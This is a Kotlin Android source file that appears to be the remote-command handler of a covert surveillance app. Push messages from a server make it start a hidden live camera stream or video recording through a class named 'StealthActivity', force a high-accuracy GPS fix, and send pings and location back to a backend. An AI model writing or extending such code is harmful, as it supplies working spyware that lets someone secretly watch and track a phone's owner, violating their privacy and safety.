package com.thirdeye.app.service

import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.thirdeye.app.uploader.BackendClient
import com.thirdeye.app.uploader.SocketManager
import com.thirdeye.app.utils.AppPreferences
import com.thirdeye.app.utils.LocationTracker

class FirebaseWakeupService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "FirebaseWakeupService"
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.i(TAG, "🔥 New FCM Registration Token received: $token")
        try {
            val prefs = AppPreferences(applicationContext)
            prefs.fcmToken = token
            BackendClient.registerFcmToken(applicationContext, token)
            SocketManager.registerDevice(applicationContext)
        } catch (e: Exception) {
            Log.w(TAG, "Error saving/dispatching new FCM token: ${e.message}")
        }
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        val data = remoteMessage.data
        if (data.isEmpty()) {
            Log.d(TAG, "Received empty FCM data payload")
            return
        }

        val action = data["action"] ?: "wake-up"
        val camera = data["camera"] ?: "BACK"
        Log.i(TAG, "⚡ High-Priority FCM Wake-Up Message received! Action: $action | Lens: $camera")

        // 1. Acquire brief partial wake lock (15s) so the CPU stays awake through service launch
        DeviceTelemetryService.acquireBriefWakeLock(applicationContext, 15000L)

        // 2. Ensure Socket is connecting/connected
        SocketManager.initAndConnect(applicationContext)

        // 3. Handle requested on-demand action
        when (action) {
            "start-live-stream" -> {
                Log.i(TAG, "🎥 FCM Command: Starting Live Stream Service ($camera)")
                try {
                    val wasRecordingRunning = CameraRecordingService.isServiceRunning
                    if (wasRecordingRunning) {
                        CameraRecordingService.stopService(applicationContext)
                    }

                    Thread {
                        try {
                            if (wasRecordingRunning) {
                                Thread.sleep(350)
                            }
                        } catch (e: Exception) {
                            // ignore
                        }
                        StealthActivity.launchForLiveStream(applicationContext, camera)
                    }.start()
                } catch (e: Exception) {
                    Log.e(TAG, "Error starting live stream from FCM: ${e.message}", e)
                }
            }

            "stop-live-stream" -> {
                Log.i(TAG, "🛑 FCM Command: Stopping Live Stream Service")
                try {
                    LiveStreamService.stopService(applicationContext)
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping live stream from FCM: ${e.message}")
                }
            }

            "record-video" -> {
                Log.i(TAG, "⏺️ FCM Command: Starting Remote Video Recording ($camera)")
                try {
                    val wasLiveRunning = LiveStreamService.isServiceRunning
                    if (wasLiveRunning) {
                        LiveStreamService.stopService(applicationContext)
                    }

                    Thread {
                        try {
                            if (wasLiveRunning) {
                                Thread.sleep(350)
                            }
                        } catch (e: Exception) {
                            // ignore
                        }
                        StealthActivity.launchForRemoteRecording(applicationContext, camera)
                    }.start()
                } catch (e: Exception) {
                    Log.e(TAG, "Error starting recording from FCM: ${e.message}", e)
                }
            }

            "stop-recording" -> {
                Log.i(TAG, "⏹️ FCM Command: Stopping Remote Video Recording")
                try {
                    CameraRecordingService.stopService(applicationContext)
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping recording from FCM: ${e.message}")
                }
            }

            "request-location" -> {
                Log.i(TAG, "🛰️ FCM Command: High-Accuracy GPS Location Refresh")
                try {
                    LocationTracker.forceRefreshLocation(applicationContext) { loc ->
                        Log.i(TAG, "📍 Fresh GPS resolved from FCM wake-up: ${loc.latitude}, ${loc.longitude}")
                        BackendClient.sendPing(applicationContext)
                        SocketManager.triggerHeartbeat()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error refreshing location from FCM: ${e.message}")
                }
            }

            "wake-up" -> {
                Log.i(TAG, "⏰ FCM Command: General Wake-Up & Telemetry Refresh")
                BackendClient.sendPing(applicationContext)
            }

            else -> {
                Log.d(TAG, "Unknown FCM action: $action, dispatching ping.")
                BackendClient.sendPing(applicationContext)
            }
        }
    }
}
